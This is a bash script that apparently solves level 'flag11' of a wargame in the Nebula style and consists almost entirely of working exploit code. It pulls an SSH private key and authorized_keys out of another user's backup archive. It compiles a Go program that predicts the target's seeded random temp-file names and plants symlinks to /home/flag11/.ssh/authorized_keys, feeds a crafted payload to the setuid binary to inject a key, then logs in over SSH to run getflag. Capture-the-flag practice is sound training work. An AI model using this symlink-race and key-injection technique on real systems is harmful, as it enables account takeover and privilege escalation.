#!/usr/bin/env bash

rm -f -r /tmp/flag11*
mkdir -p /tmp/flag11

tar -C /tmp/flag11 -f /home/flag05/.backup/*.tgz -x -z
mv -f /tmp/flag11/.ssh/id_ed25519 /tmp/flag11.key
mv -f /tmp/flag11/.ssh/authorized_keys /tmp/flag11.pub

rm -f -r /tmp/flag11
mkdir -p /tmp/flag11

cat >/tmp/flag11.go <<EOF
package main

import (
    "fmt"
    "math/rand"
    "os"
    "time"
)

func getRand(seed int64) string {
    var r *rand.Rand = rand.New(rand.NewSource(seed))

    return fmt.Sprintf(
        "%s/%d.%c%c%c%c%c%c",
        os.Getenv("TEMP"),
        os.Getpid()+1,
        'A'+r.Intn(26),
        '0'+r.Intn(10),
        'a'+r.Intn(26),
        'A'+r.Intn(26),
        '0'+r.Intn(10),
        'a'+r.Intn(26),
    )
}

func main() {
    var key string = "$(cat /tmp/flag11.pub)\\n"

    os.Symlink(
        "/home/flag11/.ssh/authorized_keys",
        getRand(time.Now().Unix()),
    )
    os.Symlink(
        "/home/flag11/.ssh/authorized_keys",
        getRand(time.Now().Unix()+1),
    )

    fmt.Printf("Content-Length: 2048\\n%s", key)
}
EOF
go build -o /tmp/flag11.bin /tmp/flag11.go

export TEMP="/tmp/flag11"
/tmp/flag11.bin | /home/flag11/flag11

ssh -i /tmp/flag11.key -l flag11 \
    -o StrictHostKeyChecking=no 127.0.0.1 getflag

rm -f -r /tmp/flag11*
